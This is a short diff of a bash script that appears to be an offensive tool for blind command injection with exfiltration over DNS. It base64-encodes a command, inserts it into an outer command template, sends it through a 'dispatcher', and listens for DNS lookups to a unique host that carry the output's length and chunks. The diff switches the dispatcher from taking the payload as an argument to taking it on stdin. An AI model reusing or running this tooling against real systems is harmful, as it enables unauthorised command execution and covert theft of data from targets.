@@ -261,8 +261,7 @@ debug_print "cmd_b64=$cmd_b64"
 outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
 debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
 
-"$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
-#(sleep 2;"$dispatcher" "$outer_cmd" >/dev/null 2>&1)&
+echo "$outer_cmd"|"$dispatcher" >/dev/null 2>&1 &
 cmd_out_len=$(listen_for ".len${unique_dns_host}")
 
 [[ -z $cmd_out_len ]] && {
@@ -295,7 +294,7 @@ for ((index_base=0;index_base<${cmd_out_len};index_base+=${nlabels}*${label_size
     outer_cmd=${outer_cmd_template//'%CMD_B64%'/$cmd_b64}
     debug_print "outer_cmd[${#outer_cmd}]=$outer_cmd"
     
-    "$dispatcher" "$outer_cmd" >/dev/null 2>&1 &
+    echo "$outer_cmd"|"$dispatcher" >/dev/null 2>&1 &
     data=$(listen_for ".iter${index_base}${unique_dns_host}")
     debug_print "data for index_base=${index_base}: $data"
     
